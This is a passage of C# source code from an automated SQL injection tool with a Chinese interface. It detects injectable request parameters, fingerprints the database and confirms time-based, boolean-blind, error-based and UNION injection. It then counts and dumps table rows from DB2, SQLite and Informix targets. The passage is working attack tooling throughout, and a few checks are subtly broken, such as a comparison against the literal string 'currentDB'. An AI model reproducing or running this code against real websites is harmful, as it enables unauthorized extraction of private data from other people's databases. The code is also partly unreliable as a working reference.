                case DBType.DB2:
                    datas_count_payload = DB2.getUnionDataValue(config.unionFillTemplate, DB2.data_count, this.curren_db, this.curren_table, "");
                    result = getOneDataByUnionOrError(datas_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);

                    this.dataCount = Tools.convertToInt(result);

                    if (this.dataCount < (dataCount + start))
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //下标从1开始
                    for (int i = 1; i <= dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        stp.WaitFor(100);
                        stp.QueueWorkItem<GetDataPam>(getDataValueByUnionByDB2, gd);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.SQLite:

                    datas_count_payload = SQLite.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLite.data_count.Replace("{table}", this.curren_table));
                    result = getOneDataByUnionOrError(datas_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);

                    this.dataCount = Tools.convertToInt(result);

                    if (this.dataCount < (dataCount + start))
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //下标从1开始
                    for (int i = 0; i < dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        stp.WaitFor(100);
                        stp.QueueWorkItem<GetDataPam>(getDataValueByUnionBySQLite, gd);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.Informix:
                    datas_count_payload = Informix.getUnionDataValue(config.unionFillTemplate, Informix.data_count, this.curren_db, this.curren_table, "", Informix.no_cast_value);
                    result = getOneDataByUnionOrErrorByInformix(datas_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);

                    this.dataCount = Tools.convertToInt(result);

                    if (this.dataCount < (dataCount + start))
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //下标从1开始
                    for (int i = 0; i < dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        stp.WaitFor(100);
                        stp.QueueWorkItem<GetDataPam>(getDataValueByUnionByInformix, gd);
                    }
                    stp.WaitForIdle();
                    break;
            }

        }

        public void getData(Object ocolumns_list)
        {
            this.currentDataCount = 0;
            this.dataCount = 0;
            int count = Tools.convertToInt(this.data_dbs_txt_count.Text);
            int start = Tools.convertToInt(this.data_dbs_txt_start.Text);
            if (count <= 0 || start < 0 || start + count <= 0)
            {
                MessageBox.Show("大哥，您在忽悠我吗，要获取多少行数据啊？");
                return;
            }
            //多线程 
            List<String> col_list = (List<String>)ocolumns_list;

            if (col_list.Count > 0)
            {
                switch (config.injectType)
                {
                    case InjectType.Blind:
                        getDatasByBool(config.dbType, col_list, start, count);
                        break;
                    case InjectType.Union:
                        getDatasByUnion(config.dbType, col_list, start, count);
                        break;
                    case InjectType.Error:
                        getDatasByError(config.dbType, col_list, start, count);
                        break;
                }
            }
            else
            {
                MessageBox.Show("请在左边点击选择列！");
            }
        }

        private void data_cms_clearLog_Click(object sender, EventArgs e)
        {

            Thread t = new Thread(Tools.delHTTPLog);
            t.Start();
            this.log_lvw_httpLog.Items.Clear();

        }
        public int autoinject = 0;
        public Thread injectThread = null;
        private void btn_autoInject_Click(object sender, EventArgs e)
        {
            if (autoinject == 0)
            {
                if (config.request.IndexOf(setInjectStr) != -1)
                {
                    MessageBox.Show("已经标记好注入，无需识别！");
                    return;
                }
                autoinject = 1;
                injectThread = new Thread(checkInject);
                injectThread.Name = "AutoCheckInjectThread-";
                injectThread.Start();
                this.btn_autoInject.Text = "停止";

            }
            else
            {
                if (injectThread != null)
                {
                    injectThread.Abort();
                }
                this.btn_autoInject.Text = "自动识别";
                autoinject = 0;
            }
        }

        public String setInject(Dictionary<String, String> paramDatas, String injectParamName, String injectParamData)
        {

            StringBuilder sb = new StringBuilder();
            foreach (KeyValuePair<String, String> kv in paramDatas)
            {
                if (injectParamName.Equals(kv.Key))
                {
                    sb.Append(kv.Key + "=" + injectParamData + "&");
                }
                else
                {
                    sb.Append(kv.Key + "=" + kv.Value + "&");
                }
            }
            if (sb.Length > 0)
            {
                sb.Remove(sb.Length - 1, 1);
            }
            return sb.ToString();
        }

        public String setInjectToRequest(String oldRequest, String newParamDatas)
        {

            if (oldRequest.StartsWith("GET"))
            {
                int start = oldRequest.IndexOf('?');
                if (start == -1)
                {
                    return oldRequest;
                }
                int end = oldRequest.IndexOf(' ', start);
                if (end > start)
                {
                    oldRequest = oldRequest.Remove(start + 1, end - start - 1);
                    oldRequest = oldRequest.Insert(start + 1, newParamDatas);
                    return oldRequest;
                }
                else
                {
                    return oldRequest;
                }

            }
            else
            {
                //POST替换参数
                String header = Regex.Split(oldRequest, "\r\n\r\n")[0];
                return header + "\r\n\r\n" + newParamDatas;

            }
        }


        public void checkInject()
        {
            try
            {
                status = 1;
                selectInjectType(InjectType.UnKnow);
                this.cbox_basic_dbType.SelectedIndex = 0;
                //判断提交数据内型
                String data = "";
                if (config.request.StartsWith("GET"))
                {
                    int start = config.request.IndexOf('?');
                    if (start == -1)
                    {
                        MessageBox.Show("没有发现参数！");
                        return;
                    }
                    int end = config.request.IndexOf(' ', start);
                    if (end > start)
                    {

                        data = config.request.Substring(start + 1, end - start - 1);
                    }
                    else
                    {
                        MessageBox.Show("无法获得GET请求的参数！");
                    }

                }
                else
                {
                    //POST
                    data = Regex.Split(config.request, "\r\n\r\n")[1];

                }

                String strparam = data.Replace("<Encode>", "").Replace("</Encode>", "").Replace(setInjectStr, "");

                //获取原始的页面信息
                String request = config.request.Replace(data, strparam);
                ServerInfo oserver = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, "获取原始页面", request, config.timeOut, HTTP.AutoGetEncoding, config.is_foward_302, config.redirectDoGet);

                //判断是否有编码设置
                if (!HTTP.AutoGetEncoding.Equals(config.encoding))
                {
                    //自定义
                    if (!config.encoding.Equals(oserver.encoding))
                    {
                        DialogResult dr = MessageBox.Show("自动识别发现网页编码为“" + oserver.encoding + ",而你选择的编码是“" + config.encoding + "””，是否采用自定义编码？", "提示信息", MessageBoxButtons.YesNo);
                        if (DialogResult.Yes.Equals(dr))
                        {
                            this.cbox_basic_encoding.Text = HTTP.AutoGetEncoding;
                        }
                    }
                }
                else
                {
                    //自动识别
                    if (String.IsNullOrEmpty(oserver.encoding))
                    {
                        DialogResult dr = MessageBox.Show("自动识别未发现网页编码，是否人工选择一个编码，不选择将默认采用" + HTTP.DefaultEncoding + "编码？", "提示信息", MessageBoxButtons.YesNo);
                        if (DialogResult.Yes.Equals(dr))
                        {
                            this.btn_autoInject.Text = "自动识别";
                            autoinject = 0;
                            return;
                        }
                    }
                    else
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "自动识别网页编码为：“" + oserver.encoding + "”", LogLevel.waring);
                    }
                }
                //拆分参数,存放到集合，方便后面从新拼接组合参数
                String[] strparams = strparam.Split('&');

                Dictionary<String, String> pdatas = new Dictionary<String, String>();

                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，发现" + strparams.Length + "个参数，请稍候正在对每一个参数进行注入测试！", LogLevel.info);

                foreach (String param in strparams)
                {
                    if (String.IsNullOrEmpty(param))
                    {
                        continue;
                    }
                    //参数拆分存放到集合
                    String[] pv = param.Split('=');
                    if (pv.Length == 2)
                    {
                        if (!pdatas.ContainsKey(pv[0]))
                        {
                            pdatas.Add(pv[0], pv[1]);
                        }
                    }
                }

                foreach (KeyValuePair<String, String> paramNameAndData in pdatas)
                {
                    String paramName = paramNameAndData.Key;
                    if (jumpkeyList.Contains(paramName))
                    {
                        continue;
                    }
                    String paramData = paramNameAndData.Value;

                    String unionStartPayLoad = "";

                    if (paramData.IndexOf("<Token>") != -1)
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "跳过Token参数检测！" + paramName, LogLevel.info);
                        continue;
                    }
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，正在对参数" + paramName + "进行盲注测试！", LogLevel.info);
                    String injectParamData = "";//标记注入
                    String payload_paramData = paramData + "<Encode>" + setInjectStr + "</Encode>";
                    String payload_request = setInjectToRequest(request, setInject(pdatas, paramName, payload_paramData));

                    String currentDB = DBType.UnKnow.ToString();
                    //通过错误显示识别数据库类型


                    //通过错误显示判断
                    ServerInfo errorDBServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, "'test", payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                    String basePath = "config/injection/error/";
                    List<String> errorDBList = FileTool.readAllDic(basePath);
                    //将错误信息，延时判断出来的数据库类型存放在这里，方便bool盲注测试在一次确认数据库类型
                    List<String> list_Find_Database = new List<String>();
                    String cdb = "";
                    foreach (String ep in errorDBList)
                    {
                        if (!String.IsNullOrEmpty(cdb)) break;
                        List<String> errorKeys = FileTool.readFileToList(basePath + ep);

                        foreach (String key in errorKeys)
                        {

                            bool find = Regex.IsMatch(errorDBServer.body, key, RegexOptions.IgnoreCase);
                            if (find)
                            {
                                currentDB = ep.Replace(".txt", "");
                                break;
                            }
                        }

                    }
                    if (!String.IsNullOrEmpty(currentDB))
                    {
                        selectDB(currentDB);
                        list_Find_Database.Add(currentDB);
                        this.txt_log.Invoke(new showLogDelegate(log), "通过错误显示信息，发现数据库为" + currentDB + "！", LogLevel.success);
                    }
                    else
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "通过错误显示信息，没有发现发现数据库类型！", LogLevel.waring);
                    }

                    //读取payload
                    List<String> list = FileTool.readFileToList("config/injection/injection.txt");

                    //判断存在bool盲注
                    bool boolInject = false;
                    bool errorInject = false;
                    bool unionInject = false;



                    if (list != null && list.Count > 0)
                    {

                        //延时注入
                        //读取payload
                        List<String> sleep_list = FileTool.readFileToList("config/injection/sleep_injection.txt");

                        //测试平均时间5次
                        int n = 5;
                        int index = 0;
                        List<int> time_list = new List<int>();
                        while (index < n)
                        {
                            ServerInfo TimeServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, "", payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            if (TimeServer.runTime != 0)
                            {
                                time_list.Add((int)TimeServer.runTime);
                            };
                            index++;
                        }
                        int avg = Tools.getMaxSecondByMillisecond(Tools.getMax(time_list));
                        if (avg != 0)
                        {
                            int time = avg + 1;

                            if (config.timeOut < time)
                            {
                                config.timeOut += 5;
                            }

                            //检测

                            foreach (String cpal in sleep_list)
                            {
                                //Informix不能设定时间，默认5秒
                                if (DBType.Informix.ToString().Equals(cpal[2]))
                                {
                                    time = 5;
                                    if (avg > time)
                                    {
                                        continue;
                                    }
                                    if (config.timeOut < time)
                                    {
                                        config.timeOut += 5;
                                    }
                                }
                                String[] pals = cpal.Split(DBVers_Splite_Str);
                                String cpayload = pals[0].Replace("{time}", time.ToString());
                                this.txt_log.Invoke(new showLogDelegate(log), "正在测试PayLoad:" + cpayload, LogLevel.info);
                                ServerInfo sleepServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, cpayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                                if (sleepServer.runTime > (time * 1000 - Tools.deviation) && sleepServer.runTime < config.timeOut * 1000)
                                {
                                    //再次发包测试，降低误报
                                    sleepServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, cpayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                                    if (sleepServer.runTime > time * 1000 - Tools.deviation)
                                    {
                                        this.cbox_inject_type.SelectedIndex = Convert.ToInt32(KeyType.Time);
                                        this.chk_inject_reverseKey.Checked = false;
                                        this.txt_inject_key.Text = time.ToString();

                                        selectInjectType(InjectType.Blind);
                                        injectParamData = paramData + "<Encode>" + pals[0].Replace(pals[3], setInjectStr) + "</Encode>";
                                        String new_request = setInjectToRequest(request, setInject(pdatas, paramName, injectParamData));
                                        config.request = new_request;
                                        //如果延时判断的数据库类型和错误显示判断的数据库类型不一致，红色提示
                                        if (!currentDB.Equals(pals[2]) && !DBType.UnKnow.ToString().Equals(currentDB))
                                        {
                                            list_Find_Database.Add(pals[2]);
                                            this.txt_log.Invoke(new showLogDelegate(log), "通过延时判断的数据库类型为:" + pals[2] + "，而错误显示信息判断数据库为：" + currentDB, LogLevel.error);
                                        }
                                        else
                                        {
                                            currentDB = pals[2];
                                        }
                                        selectDB(currentDB);
                                        config.injectType = InjectType.Blind;
                                        config.testPayload = cpayload;
                                        config.dbType = Tools.caseDBType(currentDB);

                                        config.pname = paramName;
                                        config.uri = Tools.getRequestURI(request);
                                        logInject(config);
                                        this.txt_log.Invoke(new showLogDelegate(log), "测试可能存在延时注入:" + cpayload + "----数据库类型：" + currentDB, LogLevel.success);
                                        //设置Union前缀字符
                                        unionStartPayLoad = Tools.getUnionStartStrByBoolSleep(cpayload);
                                        break;
                                    }
                                }

                            }
                        }


                        //bool盲注
                        foreach (String pal in list)
                        {
                            this.txt_log.Invoke(new showLogDelegate(log), "正在测试PayLoad:" + pal, LogLevel.info);
                            String[] pals = pal.Split(DBVers_Splite_Str);

                            ServerInfo falseServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, pals[1], payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            decimal pfalse = Tools.getLike(oserver.body, falseServer.body);
                            if (pfalse > 99)
                            {
                                continue;
                            }
                            ServerInfo trueServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, pals[0], payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            decimal ptrue = Tools.getLike(oserver.body, trueServer.body);
                            if (oserver.code != 404 && !InjectionTools.errer_code.Contains(oserver.code.ToString()) && !InjectionTools.errer_code.Contains(trueServer.code.ToString()) && !InjectionTools.errer_code.Contains(falseServer.code.ToString()) && trueServer.body.Length > 0 && falseServer.body.Length > 0)
                            {

                                //判断存在bool盲注
                                //根据状态码判断
                                if (oserver.code == trueServer.code && trueServer.code != falseServer.code)
                                {
                                    //选择盲注配置
                                    this.txt_inject_key.Text = oserver.code + "";
                                    this.cbox_inject_type.SelectedIndex = Convert.ToInt32(KeyType.Code);
                                    this.chk_inject_reverseKey.Checked = false;
                                    boolInject = true;
                                    this.txt_log.Invoke(new showLogDelegate(log), "根据状态码判断存在SQL注入!", LogLevel.success);
                                }

                                if (falseServer.body.Length < trueServer.body.Length)
                                {
                                    if (ptrue == 100)
                                    {

                                        if (ptrue > pfalse)
                                        {
                                            //根据相似度判断
                                            this.txt_log.Invoke(new showLogDelegate(log), "根据相似度判断存在SQL注入！固定长度,相似度--false|true1|true2--" + pfalse + "|" + ptrue + "%", LogLevel.success);
                                            boolInject = true;
                                            this.cbox_inject_type.SelectedIndex = Convert.ToInt32(KeyType.Code);
                                            this.chk_inject_reverseKey.Checked = false;
                                            //判断关键字
                                            checkTheKey(trueServer, falseServer, oserver);
                                        }
                                    }
                                    else
                                    {

                                        ServerInfo true1Server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, pals[0].Replace("1%3d1", "2%3d2"), payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                                        decimal p = Tools.getLike(oserver.body, true1Server.body);
                                        if (ptrue - pfalse >= 2 && Math.Abs(p - pfalse) >= 2)
                                        {
                                            //根据相似度判断
                                            this.txt_log.Invoke(new showLogDelegate(log), "根据相似度判断存在SQL注入！动态长度,相似度--false|true1|true2--" + pfalse + "|" + ptrue + "|" + p + "%", LogLevel.success);
                                            boolInject = true;
                                            //判断关键字
                                            checkTheKey(trueServer, falseServer, oserver);
                                        }


                                    }
                                }
                            }
                            else
                            {
                                this.txt_log.Invoke(new showLogDelegate(log), "程序判断不存在SQL注入！", LogLevel.info);
                            }

                            if (boolInject)
                            {

                                this.txt_log.Invoke(new showLogDelegate(log), "存在" + pals[2] + "payload:" + pals[0], LogLevel.success);
                                config.testPayload = pals[0];
                                selectInjectType(InjectType.Blind);
                                //识别数据库
                                List<String> database_lsit = FileTool.readAllDic("config/database/");

                                foreach (String d in database_lsit)
                                {

                                    String db = d.Replace(".txt", "");

                                    //为了更准确，这里再一次通过bool方式确认数据库类型
                                    if (!list_Find_Database.Contains(db) && !DBType.UnKnow.ToString().Equals(currentDB))
                                    {
                                        continue;
                                    }

                                    this.txt_log.Invoke(new showLogDelegate(log), "正在判断是否是" + db + "数据库", LogLevel.info);

                                    List<String> dbpayload_list = FileTool.readFileToList("config/database/" + d);
                                    foreach (String cdpay in dbpayload_list)
                                    {
                                        ServerInfo dbServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, pals[0].Replace("1=1", cdpay), payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                                        Boolean istrue = Tools.isTrue(dbServer, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);
                                        if (istrue)
                                        {
                                            this.txt_log.Invoke(new showLogDelegate(log), "程序判断数据库为" + db + "数据库", LogLevel.success);
                                            currentDB = db;
                                            selectDB(currentDB);
                                            break;
                                        }
                                    }
                                }
                                //用于标记注入的新字符
                                injectParamData = paramData + "<Encode>" + pals[0].Replace(pals[3], setInjectStr) + "</Encode>";

                                //设置Union前缀字符
                                unionStartPayLoad = pals[0].Substring(0, pals[0].IndexOf(pals[3]));

                                if (!String.IsNullOrEmpty(currentDB))
                                {

                                    selectDB(currentDB);
                                }
                                else
                                {

                                    this.txt_log.Invoke(new showLogDelegate(log), "没有发现发现数据库类型，可能是其他数据库，请人工判断！", LogLevel.waring);

                                }

                                break;
                            }
                        }
                    }
                    else
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，没有读取到config/injection/injection.txt注入测试payload！", LogLevel.error);
                    }
                    //记录注入日志
                    if (boolInject)
                    {
                        config.injectType = InjectType.Blind;
                        String new_request = setInjectToRequest(request, setInject(pdatas, paramName, injectParamData));
                        config.request = new_request;
                        this.txt_inject_request.Text = new_request;
                        config.dbType = Tools.caseDBType(currentDB);
                        config.pname = paramName;
                        config.uri = Tools.getRequestURI(request);
                        logInject(config);
                    }


                    //错误注入测试
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，盲注测试完成，正在进行错误显示注入测试！", LogLevel.info);

                    if (DBType.Access.ToString().Equals("currentDB"))
                    {

                        this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，Access数据库不支持错误显示注入，已自动跳过！", LogLevel.info);
                    }
                    else
                    {
                        //读取payload
                        List<String> error_list = FileTool.readFileToList("config/injection/error_injection.txt");
                        if (error_list != null && error_list.Count > 0)
                        {
                            foreach (String cpal in error_list)
                            {

                                String[] pals = cpal.Split(DBVers_Splite_Str);
                                //如果已经识别出了数据库类型，根据对应的数据库类型加载错误显示payload
                                if (!config.dbType.ToString().Equals(pals[3]) && !config.dbType.Equals(DBType.UnKnow))
                                {
                                    continue;
                                }

                                ServerInfo errorServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, HttpUtility.UrlDecode(pals[0]), payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                                if (errorServer.body.IndexOf(pals[1]) != -1)
                                {
                                    this.txt_log.Invoke(new showLogDelegate(log), "发现" + pals[2], LogLevel.success);
                                    currentDB = pals[3];
                                    selectDB(currentDB);
                                    //标记注入
                                    selectInjectType(InjectType.Error);
                                    errorInject = true;
                                    injectParamData = paramData + "<Encode>" + pals[0].Replace(pals[4], setInjectStr) + "</Encode>";
                                    config.testPayload = pals[0];
                                    unionStartPayLoad = pals[0].Substring(0, pals[0].IndexOf(pals[4])).Replace(" or", " and");
                                    this.txt_log.Invoke(new showLogDelegate(log), "自动标记错误显示注入完成！", LogLevel.info);
                                    break;
                                }

                            }
                        }
                        else
                        {
                            this.txt_log.Invoke(new showLogDelegate(log), "没有读取到错误显示注入测试payload！", LogLevel.error);
                        }

                    }
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，错误显示测试完成，正在进行Union注入测试！", LogLevel.info);

                    //记录注入日志
                    if (errorInject)
                    {
                        config.injectType = InjectType.Error;
                        String new_request = setInjectToRequest(request, setInject(pdatas, paramName, injectParamData));
                        config.request = new_request;
                        config.dbType = (DBType)Tools.caseDBType(currentDB);
                        config.pname = paramName;
                        config.uri = Tools.getRequestURI(request);
                        logInject(config);
                    }

                    //union注入
                    String payload = "";

                    //前缀字符为空，通常不会有Union注入，所以跳过检测
                    if (String.IsNullOrEmpty(unionStartPayLoad))
                    {
                        continue;
                    }
                    if (DBType.MySQL.ToString().Equals(currentDB))
                    {
                        payload = unionStartPayLoad + "{payload}#";
                    }
                    else if (DBType.Access.ToString().Equals(currentDB))
                    {
                        //处理%16不能被URL编码
                        payload = unionStartPayLoad + "{payload}";
                    }
                    else
                    {
                        payload = unionStartPayLoad + "{payload}--";

                    }
                    //如果是已经识别出来bool注入，尝试使用orderby判断列数量，提高效率
                    int order = 0;
                    if (boolInject)
                    {
                        String orderpayload = " 1=1 order by {len}";
                        if (DBType.Access.ToString().Equals(currentDB))
                        {
                            //%16
                            orderpayload = orderpayload + HttpUtility.UrlDecode("%16", Encoding.UTF8);
                        }
                        else
                        {
                            orderpayload = orderpayload + "-- -";
                        }
                        order = getOrderByColumns(orderpayload, 1, config.maxClolumns);
                    }
                    int startIndex = 1;
                    int endIndex = config.maxClolumns;
                    if (order - 1 > 0)
                    {
                        startIndex = order;
                        endIndex = startIndex;
                        this.txt_log.Invoke(new showLogDelegate(log), "注入点支持order by判断，自动判断查询有" + order + "列！", LogLevel.success);
                    }

                    //判断总列数
                    Boolean isFind = false;

                    for (int i = startIndex; i <= endIndex; i++)
                    {
                        if (isFind)
                        {
                            break;
                        }
                        String rand = Tools.RandNum(5);
                        String charRand = Tools.strToChr(rand, "UTF-8", "||");
                        String informixCharRand = Tools.informixStrToChr(rand);

                        String unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, rand + ""));

                        if (DBType.Oracle.ToString().Equals(currentDB))
                        {
                            unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByOracle(i, "null"));
                        }
                        if (DBType.Access.ToString().Equals(currentDB))
                        {
                            //%16不能被URL编码
                            injectParamData = payload_paramData + "%16";
                            payload_request = setInjectToRequest(request, setInject(pdatas, paramName, payload_paramData));
                            unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, rand + "") + " from MSysAccessObjects");
                        }


                        if (DBType.Oracle.ToString().Equals(currentDB) || DBType.PostgreSQL.ToString().Equals(currentDB) || DBType.DB2.ToString().Equals(currentDB) || DBType.Informix.ToString().Equals(currentDB))
                        {
                            for (int j = 1; j <= i; j++)
                            {
                                if (DBType.DB2.ToString().Equals(currentDB))
                                {
                                    if (isFind)
                                    {
                                        break;
                                    }
                                    //获得所有组合情况
                                    List<String> tp_list = Tools.getDB2UnionTemplates(i, j);
                                    foreach (String tp in tp_list)
                                    {
                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByDB2(tp, charRand));
                                        ServerInfo cunionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                                        if (cunionServer.code == 200 && cunionServer.body.IndexOf(rand) != -1)
                                        {
                                            isFind = true;
                                            injectParamData = paramData + "<Encode>" + payload.Replace("{payload}", setInjectStr) + "</Encode>";
                                            unionInject = true;
                                            selectInjectType(InjectType.Union);
                                            this.txt_inject_unionTemplate.Text = tp;
                                            break;
                                        }
                                    }

                                }

                                else if (DBType.Informix.ToString().Equals(currentDB))
                                {
                                    if (isFind)
                                    {
                                        break;
                                    }
                                    //获得所有组合情况
                                    List<String> tp_list = Tools.getInformixUnionTemplates(i, j);
                                    foreach (String tp in tp_list)
                                    {
                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByInformix(tp, informixCharRand));
                                        ServerInfo cunionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                                        if (cunionServer.code == 200 && cunionServer.body.IndexOf(rand) != -1)
                                        {
                                            isFind = true;
                                            injectParamData = paramData + "<Encode>" + payload.Replace("{payload}", setInjectStr) + "</Encode>";
                                            unionInject = true;
                                            selectInjectType(InjectType.Union);
                                            this.txt_inject_unionTemplate.Text = tp;
                                            break;
                                        }
                                    }

                                }

                                else
                                {
                                    if (DBType.Oracle.ToString().Equals(currentDB))
                                    {
                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByOracle(i, j, charRand));

                                    }

                                    else if (DBType.PostgreSQL.ToString().Equals(currentDB))
                                    {
                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, j, charRand));
                                    }
                                    ServerInfo unionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                                    if (unionServer.code == 200 && unionServer.body.IndexOf(rand) != -1)
                                    {
                                        isFind = true;
                                        injectParamData = paramData + "<Encode>" + payload.Replace("{payload}", setInjectStr) + "</Encode>";
                                        unionInject = true;
                                        selectInjectType(InjectType.Union);
                                        this.txt_inject_unionColumnsCount.Text = i + "";
                                        this.txt_inject_showIndex.Text = j + "";
                                        break;
                                    }
                                }

                            }
                        }
                        else
                        {
                            ServerInfo unionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            for (int j = 1; j <= i; j++)
                            {
                                String basecolumn = (Tools.convertToInt(rand) + j).ToString();
                                if (unionServer.code == 200 && unionServer.body.IndexOf((basecolumn)) != -1)
                                {
                                    isFind = true;
                                    injectParamData = paramData + "<Encode>" + payload.Replace("{payload}", setInjectStr) + "</Encode>";
                                    if ("Access".Equals(currentDB))
                                    {
                                        //%16不能被URL编码
                                        injectParamData = paramData + "<Encode>" + payload.Replace("{payload}", setInjectStr) + "</Encode>%16";
                                    }
                                    selectInjectType(InjectType.Union);
                                    unionInject = true;
                                    this.txt_inject_unionColumnsCount.Text = i + "";
                                    this.txt_inject_showIndex.Text = j + "";
                                    break;
                                }
                            }
                        }
                        config.testPayload = unionPayload;

                    }
                    if (isFind)
                    {

                        this.txt_log.Invoke(new showLogDelegate(log), "此注入点支持Union注入，自动选择注入方式完成！", LogLevel.success);
                    }
                    //记录注入日志
                    if (unionInject)
                    {
                        config.injectType = InjectType.Union;
                        String new_request = setInjectToRequest(request, setInject(pdatas, paramName, injectParamData));
                        config.request = new_request;
                        config.dbType = (DBType)Tools.caseDBType(currentDB);
                        selectDB(currentDB);
                        config.pname = paramName;
                        config.uri = Tools.getRequestURI(request);
                        logInject(config);
                    }
                    if (boolInject || errorInject || unionInject)
                    {
                        //替换注入位置-标记注入
                        this.txt_inject_request.Text = setInjectToRequest(request, setInject(pdatas, paramName, injectParamData));
                    }

                }


            }
            catch (Exception e)
            {

                Tools.SysLog("识别注入发生异常！" + e.Message);
                this.txt_log.Invoke(new showLogDelegate(log), "识别注入发生异常！" + e.Message, LogLevel.error);
            }
            this.txt_log.Invoke(new showLogDelegate(log), "注入测试完成！", LogLevel.info);
            this.btn_autoInject.Text = "自动识别";
            autoinject = 0;
        }

        public void logInject(Config config)
        {
            try
            {
                String savePath = AppDomain.CurrentDomain.BaseDirectory + "/logs/injection/" + config.domain + "/" + config.port + config.uri;
                DirectoryInfo dc = new DirectoryInfo(savePath);
                dc.Create();
                if (InjectType.Blind.Equals(config.injectType))
                {
                    config.saveConfigpath = dc.FullName + "/" + config.pname + "_" + config.injectType.ToString() + "-" + config.keyType.ToString() + ".xml";
                }
                else
                {
                    config.saveConfigpath = dc.FullName + "/" + config.pname + "_" + config.injectType.ToString() + ".xml";
                }
                this.Invoke(new delegatelogInject(logInjectTolvw), config);
                XML.saveConfig(config.saveConfigpath, config);
            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "记录注入日志发生异常！" + e.Message, LogLevel.waring);
            }
        }
        delegate void delegatelogInject(Config config);

        public void logInjectTolvw(Config config)
        {
            ListViewItem lvw = new ListViewItem(config.domain);
            lvw.Tag = config.saveConfigpath;
            lvw.SubItems.Add(config.port + "");
            lvw.SubItems.Add(config.uri);
            lvw.SubItems.Add(config.pname);
            if (InjectType.Blind.Equals(config.injectType))
            {
                lvw.SubItems.Add(config.injectType.ToString() + "-" + config.keyType.ToString());
            }
            else
